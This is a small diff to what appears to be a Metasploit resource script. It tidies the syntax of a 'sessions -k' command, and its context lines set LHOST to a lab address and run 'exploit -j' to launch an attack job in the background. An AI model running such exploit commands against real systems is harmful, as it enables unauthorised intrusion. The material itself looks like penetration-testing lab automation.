@@ -48,7 +48,7 @@ set VERBOSE True
 set LHOST 192.168.56.191
 exploit -j
 
-sessions -k 1, 2, 3
+sessions -k 1,2,3
 
 sleep 15
 
